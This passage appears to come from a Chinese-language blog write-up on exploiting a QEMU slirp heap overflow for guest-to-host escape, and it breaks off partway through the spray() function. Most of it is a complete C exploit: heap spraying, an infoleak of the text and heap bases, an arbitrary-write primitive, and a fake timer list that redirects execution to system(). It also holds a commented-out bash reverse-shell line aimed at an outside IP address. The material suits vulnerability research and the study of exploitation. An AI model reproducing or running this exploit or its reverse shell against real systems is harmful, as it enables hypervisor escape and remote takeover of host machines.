*)(buf + 0x68) = 0x0000000100000000;// end of timer_list// start of active_timers/* gdb-peda$ p *timer_list-&gt;active_timers$49 = &#123; expire_time = 0x22823f5aad00, timer_list = 0x55a8d2594840, cb = 0x55a8d0b66a82 &lt;gui_update&gt;, opaque = 0x55a8d3ae6e50, next = 0x55a8d3ae6e80, attributes = 0x0, scale = 0xf4240&#125; */*(uint64_t *)(buf + 0x70) = 0; // expire_time set to 0 will trigger func cb*(uint64_t *)(buf + 0x78) = fake_timer_list;*(uint64_t *)(buf + 0x80) = text_base + 0x2a3720; // system plt*(uint64_t *)(buf + 0x88) = heap_base + 0xe42; // parameter address*(uint64_t *)(buf + 0x90) = 0;*(uint64_t *)(buf + 0x98) = 0x000f424000000000;g_spray_ip_id = 0xccbb;arbitrary_write(fake_timer_list-0x318,8,buf,0xa0,0x20);// dbg_printf("check heap here");// qemu timer// 改掉全局的main_loop_tlg*(uint64_t *)buf = fake_timer_list; // qemu_clocksg_spray_ip_id = 0xddbb;arbitrary_write(text_base+0x11f8e60-0x318,8,buf,8,0x20);return 0; 最终exp.c： 这个利用我从学习基础知识到最终调出来断断续续持续了大概小一周了。。期间数次想过放弃，但是最后还是气不过，不过比较幸运最后终于成功了： 主要有以下几个问题： malloc原语喷的次数，这是第一步，也是最重要的一步，这里卡了挺久的，开始的时候我直接拿0xKira的原exp去调，然后发现喷完0x250次之后线程堆依然很混乱，然后就把喷射次数直接改成了0x500，然后发现依然很混乱，改成0x1000之后发现比之前还要混乱，然后就很迷，后来看到raycp师傅的exp，发现他的喷射次数是0x300，而他是18.04的环境，所以我猜测这个数值可能和环境有关，我是在16.04上调的，原作者大概率不是16.04这么老的版本，所以我就从0x200一直加0x50次往后试探，多次尝试后发现我本机在0x350~0x400之间喷射成功的概率大一点，再多或者少的话就没成功过了，太少应该是因为碎片还没喷完，太多是因为原有堆空间不够，程序又申请了新的堆出来，又有大量新的碎片产生，而且发现一个规律：启动虚拟机后直接跑的成功概率较小，启动虚拟机之后先清空原有exp，然后重新把写好的exp复制粘贴过去然后再保存，再用gcc编译，再ifconfig enp0s3 mtu 9000 up，再跑exp，成功的概率会大很多。。。感觉是跑exp之前的操作对线程的堆起到了进一步稳定的作用。。。具体我也就不知道了orz。 Infoleak时的数据非常没有规律，非常非常看脸，其实这一步的成功率就是由上一步的堆喷导致的，只有上一步的喷射使堆变的稳定了，exp的chunk构造才会对的上号，才会成功leak出数据，然而leak出的数据绝大情况都是没有规律的，数据中的确是有heap_base和text_base的，但是这些数据并不是一个固定的变量和数值什么的，每次几乎都不一样，但是运气好是会有一样的，概率很低，我就找了一个我见到泄露出两次的一个text里的变量，其+8的位置是heap的变量，但概率真的感人。(其实我是前一天晚上看到这个变量被泄露出两次，然后第二天早上起来试了一上午这个变量都没有再出现过，后来再出现的那一次就是我成功的那一次了。)，失败的时候qemu经常会直接卡死，强制关闭进程再跑就行，比较麻烦。 最后劫持控制流时的指针需要根据自己编译的qemu-system-x86_64修改，有system@plt，qemu_clocks，qemu_timer_notify_cb以及最后一次arbirary_write时写的目标地址为main_loop_tlg(其地址为qemu_clocks-0x20)，而且成功与否也需要一点运气，但如果泄露成功的话，这里成功的概率会很大。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513613713813914014114214314414514614714814915015115215315415515615715815916016116216316416516616716816917017117217317417517617717817918018118218318418518618718818919019119219319419519619719819920020120220320420520620720820921021121221321421521621721821922022122222322422522622722822923023123223323423523623723823924024124224324424524624724824925025125225325425525625725825926026126226326426526626726826927027127227327427527627727827928028128228328428528628728828929029129229329429529629729829930030130230330430530630730830931031131231331431531631731831932032132232332432532632732832933033133233333433533633733833934034134234334434534634734834935035135235335435535635735835936036136236336436536636736836937037137237337437537637737837938038138238338438538638738838939039139239339439539639739839940040140240340440540640740840941041141241341441541641741841942042142242342442542642742842943043143243343443543643743843944044144244344444544644744844945045145245345445545645745845946046146246346446546646746846947047147247347447547647747847948048148248348448548648748848949049149249349449549649749849950050150250350450550650750850951051151251351451551651751851952052152252352452552652752852953053153253353453553653753853954054154254354454554654754854955055155255355455555655755855956056156256356456556656756856957057157257357457557657757857958058158258358458558658758858959059159259359459559659759859960060160260360460560660760860961061161261361461561661761861962062162262362462562662762862963063163263363463563663763863964064164264364464564664764864965065165265365465565665765865966066166266366466566666766866967067167267367467567667767867968068168268368468568668768868969069169269369469569669769869970070170270370470570670770870971071171271371471571671771871972072172272372472572672772872973073173273373473573673773873974074174274374474574674774874975075175275375475575675775875976076176276376476576676776876977077177277377477577677777877978078178278378478578678778878979079179279379479579679779879980080180280380480580680780880981081181281381481581681781881982082182282382482582682782882983083183283383483583683783883984084184284384484584684784884985085185285385485585685785885986086186286386486586686786886987087187287387487587687787887988088188288388488588688788888989089189289389489589689789889990090190290390490590690790890991091191291391491591691791891992092192292392492592692792892993093193293393493593693793893994094194294394494594694794894995095195295395495595695795895996096196296396496596696796896997097197297397497597697797897998098198298398498598698798898999099199299399499599699799899910001001100210031004100510061007100810091010101110121013101410151016101710181019102010211022102310241025102610271028102910301031103210331034103510361037103810391040104110421043104410451046104710481049105010511052105310541055105610571058105910601061106210631064106510661067106810691070107110721073107410751076107710781079108010811082108310841085108610871088108910901091109210931094109510961097109810991100110111021103110411051106110711081109111011111112111311141115111611171118#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdbool.h&gt;#include &lt;unistd.h&gt; // close()#include &lt;assert.h&gt;#include &lt;string.h&gt; // strcpy, memset(), and memcpy()#include &lt;netdb.h&gt; // struct addrinfo#include &lt;sys/types.h&gt; // needed for socket(), uint8_t, uint16_t, uint32_t#include &lt;sys/socket.h&gt; // needed for socket()#include &lt;netinet/in.h&gt; // IPPROTO_RAW, IPPROTO_IP, IPPROTO_TCP, INET_ADDRSTRLEN#include &lt;netinet/ip.h&gt; // struct ip and IP_MAXPACKET (which is 65535)#include &lt;netinet/ip_icmp.h&gt; // struct icmp, ICMP_ECHO#define __FAVOR_BSD // Use BSD format of tcp header#include &lt;netinet/tcp.h&gt; // struct tcphdr#include &lt;arpa/inet.h&gt; // inet_pton() and inet_ntop()#include &lt;sys/ioctl.h&gt; // macro ioctl is defined#include &lt;bits/ioctls.h&gt; // defines values for argument "request" of ioctl.#include &lt;net/if.h&gt; // struct ifreq#include &lt;linux/if_ether.h&gt; // ETH_P_IP = 0x0800, ETH_P_IPV6 = 0x86DD#include &lt;linux/if_packet.h&gt; // struct sockaddr_ll (see man 7 packet)#include &lt;net/ethernet.h&gt;#include &lt;sys/time.h&gt; // gettimeofday()#include &lt;errno.h&gt; // errno, perror()// Define some constants.#define ETH_HDRLEN 14 // Ethernet header length#define IP4_HDRLEN 20 // IPv4 header length#define TCP_HDRLEN 20 // TCP header length, excludes options data#define ICMP_HDRLEN 8 // ICMP header length for echo request, excludes data#define DEBUG#ifdef DEBUG#define dbg_printf(fmt, ...) \ do &#123; \ fprintf(stderr, "%s:%d(): " fmt, __func__, __LINE__, ##__VA_ARGS__); \ &#125; while (0)#else#define dbg_printf(fmt, ...) \ do &#123; \ &#125; while (0)#endif//char g_interface[] = "ens2";char g_interface[] = "enp0s3";char host[] = "10.0.2.2";typedef void *Slirp;struct socket &#123;&#125;;struct mbuf &#123; /* XXX should union some of these! */ /* header at beginning of each mbuf: */ struct mbuf *m_next; /* Linked list of mbufs */ struct mbuf *m_prev; struct mbuf *m_nextpkt; /* Next packet in queue/record */ struct mbuf *m_prevpkt; /* Flags aren't used in the output queue */ int m_flags; /* Misc flags */ int m_size; /* Size of mbuf, from m_dat or m_ext */ struct socket *m_so; caddr_t m_data; /* Current location of data */ int m_len; /* Amount of data in this mbuf, from m_data */ Slirp *slirp; bool resolution_requested; uint64_t expiration_date; char *m_ext; /* start of dynamic buffer area, must be last element */ char m_dat[];&#125;;// some header info to pass to the send_ip_pktstruct ip_pkt_info &#123; uint16_t ip_id; uint16_t ip_off; bool MF; uint8_t ip_p;&#125;;// Function prototypesuint16_t checksum(uint16_t *, int);uint16_t icmp4_checksum(struct icmp, uint8_t *, int);uint16_t tcp4_checksum(struct ip, struct tcphdr, uint8_t *, int);char *allocate_strmem(int);uint8_t *allocate_ustrmem(int);int *allocate_intmem(int);void spray(int, uint16_t);void send_ip_pkt(struct ip_pkt_info *, uint8_t *, int);void leak(uint64_t, int);int send_raw_pkt();int arbitrary_write(uint64_t, int, uint8_t *, int, int);void hexdump(const char *, void *, int);uint64_t text_base, heap_base;uint16_t g_spray_ip_id;int stop_flag;int main() &#123; const char eth_frame[] = "\x52\x56\x00\x00\x00\x02\x52\x54\x00\x12\x34\x56\x08\x00"; struct icmp *icmphdr; struct ip *iphdr; uint8_t buf[IP_MAXPACKET]; char src_ip[INET_ADDRSTRLEN], dst_ip[INET_ADDRSTRLEN]; int status; puts("game start"); memcpy(buf, eth_frame, ETH_HDRLEN); iphdr = (struct ip *)(buf + ETH_HDRLEN); strcpy(src_ip, "10.0.2.15"); strcpy(dst_ip, "10.0.2.2"); iphdr-&gt;ip_hl = IP4_HDRLEN / sizeof(uint32_t); iphdr-&gt;ip_v = 4; iphdr-&gt;ip_tos = 0; // 这不需要htons，因为在ip_input里会转换一遍 iphdr-&gt;ip_len = (ICMP_HDRLEN); iphdr-&gt;ip_id = (0xcdcd); // Zero (1 bit) // Do not fragment flag (1 bit) // More fragments following flag (1 bit) // Fragmentation offset (13 bits) iphdr-&gt;ip_off = ((0 &lt;&lt; 15) + (0 &lt;&lt; 14) + (0 &lt;&lt; 13) + (0 &gt;&gt; 3)); iphdr-&gt;ip_ttl = 255; iphdr-&gt;ip_p = IPPROTO_ICMP; if ((status = inet_pton(AF_INET, src_ip, &amp;(iphdr-&gt;ip_src))) != 1 || (status = inet_pton(AF_INET, dst_ip, &amp;(iphdr-&gt;ip_dst))) != 1) &#123; dbg_printf("inet_pton() failed.\nError message: %s", strerror(status)); exit(EXIT_FAILURE); &#125; iphdr-&gt;ip_sum = 0; iphdr-&gt;ip_sum = checksum((uint16_t *)&amp;iphdr, IP4_HDRLEN); icmphdr = (struct icmp *)(buf + ETH_HDRLEN + IP4_HDRLEN); icmphdr-&gt;icmp_type = ICMP_ECHO; // Message Code (8 bits): echo request icmphdr-&gt;icmp_code = 0; // Identifier (16 bits): usually pid of sending process - pick a number icmphdr-&gt;icmp_id = htons(1000); // Sequence Number (16 bits): starts at 0 icmphdr-&gt;icmp_seq = htons(0); // ICMP header checksum (16 bits): set to 0 when calculating checksum // TBD // icmphdr-&gt;icmp_cksum = icmp4_checksum(icmphdr, data, datalen); icmphdr-&gt;icmp_cksum = icmp4_checksum(*icmphdr, buf, 0); const char exec_cmd[] = "gnome-calculator"; // "/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/172.16.217.1/8888 0&gt;&amp;1'"; // const char exec_cmd[] = "DISPLAY=:0 /usr/bin/snap run gnome-calculator"; memcpy(buf+ETH_HDRLEN+IP4_HDRLEN+ICMP_HDRLEN,exec_cmd,strlen(exec_cmd)+1); g_spray_ip_id = 0xaabb; stop_flag = 1; arbitrary_write(0x0b00,3,buf,ETH_HDRLEN+IP4_HDRLEN+ICMP_HDRLEN+strlen(exec_cmd)+1,0x400); g_spray_ip_id = 0xbbaa; leak(0x0b00+0x318+0x14+ETH_HDRLEN,3); //reass处理完后会把m_data减掉ip头的长度 dbg_printf("after leak"); // fake timer_list /* gdb-peda$ p *timer_list $45 = &#123; clock = 0x55a8d1473380 &lt;qemu_clocks&gt;, active_timers_lock = &#123; lock = pthread_mutex_t = &#123; Type = Normal, Status = Not acquired, Robust = No, Shared = No, Protocol = None &#125;, file = 0x0, line = 0x0, initialized = 0x1 &#125;, active_timers = 0x55a8d3641df0, list = &#123; le_next = 0x0, le_prev = 0x55a8d2594cb8 &#125;, notify_cb = 0x55a8d076c793 &lt;qemu_timer_notify_cb&gt;, notify_opaque = 0x0, timers_done_ev = &#123; value = 0x0, initialized = 0x1 &#125; &#125; */ uint64_t fake_timer_list = heap_base + 0x1000; *(uint64_t *)buf = text_base + 0x11f8e80; // qemu_clocks 0x11f8e80 memset(buf + 8, 0, 8 * 6); *(uint64_t *)(buf + 0x38) = 0x0000000100000000; *(uint64_t *)(buf + 0x40) = fake_timer_list + 0x70; // active_timers *(uint64_t *)(buf + 0x48) = 0; *(uint64_t *)(buf + 0x50) = 0; *(uint64_t *)(buf + 0x58) = text_base + 0x2f2ee0; // qemu_timer_notify_cb 0x2f2ee0 *(uint64_t *)(buf + 0x60) = 0; *(uint64_t *)(buf + 0x68) = 0x0000000100000000; // end of timer_list // start of active_timers /* gdb-peda$ p *timer_list-&gt;active_timers $49 = &#123; expire_time = 0x22823f5aad00, timer_list = 0x55a8d2594840, cb = 0x55a8d0b66a82 &lt;gui_update&gt;, opaque = 0x55a8d3ae6e50, next = 0x55a8d3ae6e80, attributes = 0x0, scale = 0xf4240 &#125; */ *(uint64_t *)(buf + 0x70) = 0; // expire_time set to 0 will trigger func cb *(uint64_t *)(buf + 0x78) = fake_timer_list; *(uint64_t *)(buf + 0x80) = text_base + 0x2a3720; // system plt *(uint64_t *)(buf + 0x88) = heap_base + 0xe42; // parameter address *(uint64_t *)(buf + 0x90) = 0; *(uint64_t *)(buf + 0x98) = 0x000f424000000000; g_spray_ip_id = 0xccbb; arbitrary_write(fake_timer_list-0x318,8,buf,0xa0,0x20); // dbg_printf("check heap here"); // qemu timer // 改掉全局的main_loop_tlg *(uint64_t *)buf = fake_timer_list; // qemu_clocks g_spray_ip_id = 0xddbb; arbitrary_write(text_base+0x11f8e60-0x318,8,buf,8,0x20); return 0;&#125;void leak(uint64_t addr, int addr_len) &#123; int s, len, i, recvsd; struct sockaddr_in ip_addr; int ret; struct ip_pkt_info pkt_info; uint8_t *payload = (uint8_t *)malloc(IP_MAXPACKET); uint8_t *payload_start = payload; uint32_t *payload32 = (uint32_t *)payload; uint64_t *payload64 = (uint64_t *)payload; memset(payload, 'A', 0x1000); dbg_printf("in leak_text...\n"); for (i = 0; i &lt; 0x20; ++i) &#123; dbg_printf("spraying size 0x2000, id: %d\n", i); spray(0x2000, g_spray_ip_id + i); &#125; dbg_printf("spray finished.\n"); // getchar(); s = socket(AF_INET, SOCK_STREAM, 0); ip_addr.sin_family = AF_INET; ip_addr.sin_addr.s_addr = inet_addr(host); ip_addr.sin_port = htons(113); // vulnerable port len = sizeof(struct sockaddr_in); ret = connect(s, (struct sockaddr *)&amp;ip_addr, len); if (ret == -1) &#123; perror("0ops: client"); exit(1); &#125; pkt_info.ip_id = 0xdead; pkt_info.ip_off = 0; pkt_info.MF = 1; pkt_info.ip_p = IPPROTO_ICMP; send_ip_pkt(&amp;pkt_info, payload, 0x300 + 4); // 这个packet就在so_rcv的后面 /* let's overflow here! send(xxx) */ for (i = 0; i &lt; 6; ++i) &#123; write(s, payload, 0x500); // 不能send一个满的m_buf，因为会有一个off by // null = =。。。。 usleep(20000); // 不知道为啥，貌似内核会合并包？ // 如果合并了就会off by null... // 所以sleep一下 dbg_printf("send %d complete\n", i + 1); &#125; write(s, payload, 1072); // actual overflow here *payload64++ = 0; *payload64++ = 0x675; // chunk header *payload64++ = 0; // m_next *payload64++ = 0; // m_prev *payload64++ = 0; // m_nextpkt *payload64++ = 0; // m_prevpkt payload32 = (uint32_t *)payload64; *payload32++ = 0; // m_flags *payload32++ = 0x608; // m_size payload64 = (uint64_t *)payload32; *payload64++ = 0; // m_so payload = (uint8_t *)payload64; assert(addr_len &lt;= 8); for (i = 0; i &lt; addr_len; ++i) &#123; *payload++ = (addr &gt;&gt; (i * 8)) &amp; 0xff; // m_data &#125; write(s, payload_start, (uint8_t *)payload - payload_start); // write(s, payload, 0x1000); dbg_printf("trigger reass!"); // getchar(); memset(payload, 'A', 0x1000); pkt_info.ip_id = 0xdead; pkt_info.ip_off = 0x300 + 24; pkt_info.MF = 0; pkt_info.ip_p = IPPROTO_ICMP; recvsd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL)); send_ip_pkt(&amp;pkt_info, payload, 0); // we receive data here int bytes, status; struct ip *recv_iphdr; struct icmp *recv_icmphdr; uint8_t recv_ether_frame[IP_MAXPACKET]; struct sockaddr from; socklen_t fromlen; struct timeval wait, t1, t2; struct timezone tz; double dt; (void)gettimeofday(&amp;t1, &amp;tz); wait.tv_sec = 2; wait.tv_usec = 0; setsockopt(recvsd, SOL_SOCKET, SO_RCVTIMEO, (char *)&amp;wait, sizeof(struct timeval)); recv_iphdr = (struct ip *)(recv_ether_frame + ETH_HDRLEN); recv_icmphdr = (struct icmp *)(recv_ether_frame + ETH_HDRLEN + IP4_HDRLEN); int count = 0; while (1) &#123; memset(recv_ether_frame, 0, IP_MAXPACKET * sizeof(uint8_t)); memset(&amp;from, 0, sizeof(from)); fromlen = sizeof(from); if ((bytes = recvfrom(recvsd, recv_ether_frame, IP_MAXPACKET, 0, (struct sockaddr *)&amp;from, &amp;fromlen)) &lt; 0) &#123; status = errno; if (status == EAGAIN) &#123; // EAGAIN = 11 dbg_printf("No reply within %li seconds.\n", wait.tv_sec); exit(EXIT_FAILURE); &#125; else if (status == EINTR) &#123; // EINTR = 4 continue; &#125; else &#123; perror("recvfrom() failed "); exit(EXIT_FAILURE); &#125; &#125; // End of error handling conditionals. // hexdump("recv", recv_ether_frame, 0x50); dbg_printf("recv count %d\n", count++); if ((((recv_ether_frame[12] &lt;&lt; 8) + recv_ether_frame[13]) == ETH_P_IP) &amp;&amp; (recv_iphdr-&gt;ip_p == IPPROTO_ICMP) &amp;&amp; (recv_icmphdr-&gt;icmp_type == ICMP_ECHOREPLY)) &#123; // Stop timer and calculate how long it took to get a reply. (void)gettimeofday(&amp;t2, &amp;tz); dt = (double)(t2.tv_sec - t1.tv_sec) * 1000.0 + (double)(t2.tv_usec - t1.tv_usec) / 1000.0; // 底下这个可能会segfault // if (inet_ntop(AF_INET, &amp;(recv_iphdr-&gt;ip_src.s_addr), rec_ip, // INET_ADDRSTRLEN) == NULL) &#123; // status = errno; // fprintf(stderr, "inet_ntop() failed.\nError message: %s", // strerror(status)); exit(EXIT_FAILURE); // &#125; dbg_printf("%g ms (%i bytes received)\n", dt, bytes);#ifdef DEBUG hexdump("ping recv", recv_ether_frame, bytes);#endif if (bytes &lt; 0x200) continue; //7e 64 cb 55 55 55 //text_base = // ((*(uint64_t *)(recv_ether_frame + 0x88)) - 0x76247e) &amp; ~0xfff; //heap_base = (*(uint64_t *)(recv_ether_frame + 0x90)) &amp; ~0xffffff; text_base = 0; heap_base = 0; uint64_t* tmp_ptr = NULL; uint64_t tmp_addr = 0; for(int i = 0;i &lt; 846;i += 8)&#123; tmp_ptr = recv_ether_frame + i; tmp_addr = *tmp_ptr; if(text_base != 0 &amp;&amp; heap_base != 0)&#123; break; &#125; printf("%d: %p\n",i,tmp_addr); if(tmp_addr &gt; 0x550000000000 &amp;&amp; ((tmp_addr&amp;0xfff) == 0x47e))&#123; text_base = tmp_addr - 0x76247e; heap_base = (*(uint64_t*)(recv_ether_frame + i + 8)) &amp; ~0xffffff; &#125; &#125; if(text_base == 0)&#123; perror("leak error...."); exit(-1); &#125; //getchar(); dbg_printf("leak text_base: 0x%lx\n" "leak heap_base: 0x%lx\n", text_base, heap_base); // getchar(); break; &#125; // End if IP ethernet frame carrying ICMP_ECHOREPLY &#125; close(s); close(recvsd); free(payload_start); if(stop_flag)&#123; puts("trigger!"); getchar(); &#125; return;&#125;int arbitrary_write(uint64_t addr, int addr_len, uint8_t *write_data, int write_data_len, int spray_times) &#123; int s, len, i; struct sockaddr_in ip_addr; int ret; struct ip_pkt_info pkt_info; uint8_t *payload = (uint8_t *)malloc(IP_MAXPACKET); uint8_t *payload_start = payload; uint32_t *payload32 = (uint32_t *)payload; uint64_t *payload64 = (uint64_t *)payload; memset(payload, 'A', 0x1000); for (i = 0; i &lt; spray_times; ++i) &#123; dbg_printf("spraying size 0x2000, id: %d\n", i); spray(0x2000, g_spray_ip_id + i); &#125; dbg_printf("spray finished.\n"); s = socket(AF_INET, SOCK_STREAM, 0); ip_addr.sin_family = AF_INET; ip_addr.sin_addr.s_addr = inet_addr(host); ip_addr.sin_port = htons(113); // vulnerable port len = sizeof(struct sockaddr_in); ret = connect(s, (struct sockaddr *)&amp;ip_addr, len); if (ret == -1) &#123; perror("oops: client"); exit(1); &#125; pkt_info.ip_id = 0xdead; pkt_info.ip_off = 0; pkt_info.MF = 1; pkt_info.ip_p = 0xff; send_ip_pkt(&amp;pkt_info, payload, 0x300 + 4); // 这个packet就在so_rcv的后面 /* let's overflow here! send(xxx) */ for (i = 0; i &lt; 6; ++i) &#123; write(s, payload, 0x500); // 不能send一个满的m_buf，因为会有一个off by // null = =。。。。 usleep(20000); // 不知道为啥，貌似内核会合并包？ // 如果合并了就会off by null... // 所以sleep一下 dbg_printf("send %d complete\n", i + 1); &#125; write(s, payload, 1072); // actual overflow here *payload64++ = 0; *payload64++ = 0x675; // chunk header *payload64++ = 0; // m_next *payload64++ = 0; // m_prev *payload64++ = 0; // m_nextpkt *payload64++ = 0; // m_prevpkt payload32 = (uint32_t *)payload64; *payload32++ = 0; // m_flags *payload32++ = 0x608; // m_size payload64 = (uint64_t *)payload32; *payload64++ = 0; // m_so payload = (uint8_t *)payload64; assert(addr_len &lt;= 8); for (i = 0; i &lt; addr_len; ++i) &#123; *payload++ = (addr &gt;&gt; (i * 8)) &amp; 0xff; // m_data &#125; write(s, payload_start, (uint8_t *)payload - payload_start); // write(s, payload, 0x1000); pkt_info.ip_id = 0xdead; pkt_info.ip_off = 0x300 + 24; pkt_info.MF = 0; pkt_info.ip_p = 0xff; send_ip_pkt(&amp;pkt_info, write_data, write_data_len); close(s); free(payload_start); if (stop_flag) &#123; puts("trigger!"); getchar(); &#125; return 0;&#125;// 真正malloc的大小是payloadlen + 64void send_ip_pkt(struct ip_pkt_info *pkt_info, uint8_t *payload, int payloadlen) &#123; int status, sd, *ip_flags, *tcp_flags; const int on = 1; char *interface, *src_ip, *dst_ip; struct ip iphdr; uint8_t *packet; struct sockaddr_in sin; struct ifreq ifr; // Allocate memory for various arrays. packet = allocate_ustrmem(IP_MAXPACKET); interface = allocate_strmem(40); src_ip = allocate_strmem(INET_ADDRSTRLEN); dst_ip = allocate_strmem(INET_ADDRSTRLEN); ip_flags = allocate_intmem(4); tcp_flags = allocate_intmem(8); // Interface to send packet through. strcpy(interface, g_interface); // Submit request for a socket descriptor to look up interface. if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; 0) &#123; perror("socket() failed to get socket descriptor for using ioctl() "); exit(EXIT_FAILURE); &#125; // Use ioctl() to look up interface index which we will use to // bind socket descriptor sd to specified interface with setsockopt() since // none of the other arguments of sendto() specify which interface to use. memset(&amp;ifr, 0, sizeof(ifr)); snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", interface); if (ioctl(sd, SIOCGIFINDEX, &amp;ifr) &lt; 0) &#123; perror("ioctl() failed to find interface "); exit(EXIT_FAILURE); &#125; close(sd); // Source IPv4 address: you need to fill this out strcpy(src_ip, "127.0.0.1"); strcpy(dst_ip, "127.0.0.1"); // IPv4 header // IPv4 header length (4 bits): Number of 32-bit words in header = 5 iphdr.ip_hl = IP4_HDRLEN / sizeof(uint32_t); // Internet Protocol version (4 bits): IPv4 iphdr.ip_v = 4; // Type of service (8 bits) iphdr.ip_tos = 0; // Total length of datagram (16 bits): IP header + TCP header + TCP data iphdr.ip_len = htons(IP4_HDRLEN + payloadlen); // ID sequence number (16 bits): unused, since single datagram iphdr.ip_id = htons(pkt_info-&gt;ip_id); // Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram // Zero (1 bit) ip_flags[0] = 0; // Do not fragment flag (1 bit) ip_flags[1] = 0; // More fragments following flag (1 bit) ip_flags[2] = pkt_info-&gt;MF; // Fragmentation offset (13 bits) ip_flags[3] = 0; iphdr.ip_off = htons((ip_flags[0] &lt;&lt; 15) + (ip_flags[1] &lt;&lt; 14) + (ip_flags[2] &lt;&lt; 13) + ip_flags[3] + (pkt_info-&gt;ip_off &gt;&gt; 3)); // Time-to-Live (8 bits): default to maximum value iphdr.ip_ttl = 255; // Transport layer protocol (8 bits): 6 for TCP iphdr.ip_p = pkt_info-&gt;ip_p; // iphdr.ip_p = IPPROTO_TCP; // Source IPv4 address (32 bits) if ((status = inet_pton(AF_INET, src_ip, &amp;(iphdr.ip_src))) != 1) &#123; dbg_printf("inet_pton() failed.\nError message: %s", strerror(status)); exit(EXIT_FAILURE); &#125; // Destination IPv4 address (32 bits) if ((status = inet_pton(AF_INET, dst_ip, &amp;(iphdr.ip_dst))) != 1) &#123; dbg_printf("inet_pton() failed.\nError message: %s", strerror(status)); exit(EXIT_FAILURE); &#125; // IPv4 header checksum (16 bits): set to 0 when calculating checksum iphdr.ip_sum = 0; iphdr.ip_sum = checksum((uint16_t *)&amp;iphdr, IP4_HDRLEN); // Prepare packet. // First part is an IPv4 header. memcpy(packet, &amp;iphdr, IP4_HDRLEN * sizeof(uint8_t)); // Last part is upper layer protocol data. memcpy((packet + IP4_HDRLEN), payload, payloadlen * sizeof(uint8_t)); // The kernel is going to prepare layer 2 information (ethernet frame // header) for us. For that, we need to specify a destination for the kernel // in order for it to decide where to send the raw datagram. We fill in a // struct in_addr with the desired destination IP address, and pass this // structure to the sendto() function. memset(&amp;sin, 0, sizeof(struct sockaddr_in)); sin.sin_family = AF_INET; sin.sin_addr.s_addr = iphdr.ip_dst.s_addr; // Submit request for a raw socket descriptor. if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; 0) &#123; perror("socket() failed "); exit(EXIT_FAILURE); &#125; // Set flag so socket expects us to provide IPv4 header. if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &amp;on, sizeof(on)) &lt; 0) &#123; perror("setsockopt() failed to set IP_HDRINCL "); exit(EXIT_FAILURE); &#125; // Bind socket to interface index. if (setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, &amp;ifr, sizeof(ifr)) &lt; 0) &#123; perror("setsockopt() failed to bind to interface "); exit(EXIT_FAILURE); &#125; // Send packet. if (sendto(sd, packet, IP4_HDRLEN + TCP_HDRLEN + payloadlen, 0, (struct sockaddr *)&amp;sin, sizeof(struct sockaddr)) &lt; 0) &#123; perror("sendto() failed "); exit(EXIT_FAILURE); &#125; // Close socket descriptor. close(sd); // Free allocated memory. free(packet); free(interface); free(src_ip); free(dst_ip); free(ip_flags); free(tcp_flags);&#125;void spray(int size, uint16_t ip_id) &#123; int i, status, sd, *ip_flags, *tcp_flags; const int on = 1; char *interface, *src_ip, *dst_ip; struct ip iphdr; struct tcphdr tcphdr; char *payload; int payloadlen; uint8_t *packet; struct sockaddr_in sin; struct ifreq ifr; // Allocate memory for various arrays. packet = allocate_ustrmem(IP_MAXPACKET); interface = allocate_strmem(40); src_ip = allocate_strmem(INET_ADDRSTRLEN); dst_ip = allocate_strmem(INET_ADDRSTRLEN); ip_flags = allocate_intmem(4); tcp_flags = allocate_intmem(8); payload = allocate_strmem(IP_MAXPACKET); payloadlen = size - 84; // Interface to send packet through. strcpy(interface, g_interface); // Submit request for a socket descriptor to look up interface. if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; 0) &#123; perror("socket() failed to get socket descriptor for using ioctl() "); exit(EXIT_FAILURE); &#125; // Use ioctl() to look up interface index which we will use to // bind socket descriptor sd to specified interface with setsockopt() since // none of the other arguments of sendto() specify which interface to use. memset(&amp;ifr, 0, sizeof(ifr)); snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", interface); if (ioctl(sd, SIOCGIFINDEX, &amp;ifr) &lt; 0) &#123; perror("ioctl() failed to find interface "); exit(EXIT_FAILURE); &#125; close(sd); // dbg_printf("Index for interface %s is %i\n", interface, ifr.ifr_ifindex); // Source IPv4 address: you need to fill this out strcpy(src_ip, "127.0.0.1"); strcpy(dst_ip, "127.0.0.1"); // IPv4 header // IPv4 header length (4 bits): Number of 32-bit words in header = 5 iphdr.ip_hl = IP4_HDRLEN / sizeof(uint32_t); // Internet Protocol version (4 bits): IPv4 iphdr.ip_v = 4; // Type of service (8 bits) iphdr.ip_tos = 0; // Total length of datagram (16 bits): IP header + TCP header + TCP data iphdr.ip_len = htons(IP4_HDRLEN + TCP_HDRLEN + payloadlen); // ID sequence number (16 bits): unused, since single datagram iphdr.ip_id = htons(ip_id); // Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram // Zero (1 bit) ip_flags[0] = 0; // Do not fragment flag (1 bit) ip_flags[1] = 0; // More fragments following flag (1 bit) ip_flags[2] = 1; // Fragmentation offset (13 bits) ip_flags[3] = 0; iphdr.ip_off = htons((ip_flags[0] &lt;&lt; 15) + (ip_flags[1] &lt;&lt; 14) + (ip_flags[2] &lt;&lt; 13) + ip_flags[3]); // Time-to-Live (8 bits): default to maximum value iphdr.ip_ttl = 255; // Transport layer protocol (8 bits): 6 for TCP iphdr.ip_p = IPPROTO_TCP; // Source IPv4 address (32 bits) if ((status = inet_pton(AF_INET, src_ip, &amp;(iphdr.ip_src))) != 1) &#123; dbg_printf("inet_pton() failed.\nError message: %s", strerror(status)); exit(EXIT_FAILURE); &#125; // Destination IPv4 address (32 bits) if ((status = inet_pton(AF_INET, dst_ip, &amp;(iphdr.ip_dst))) != 1) &#123; dbg_printf("inet_pton() failed.\nError message: %s", strerror(status)); exit(EXIT_FAILURE); &#125; // IPv4 header checksum (16 bits): set to 0 when calculating checksum iphdr.ip_sum = 0; iphdr.ip_sum = checksum((uint16_t *)&amp;iphdr, 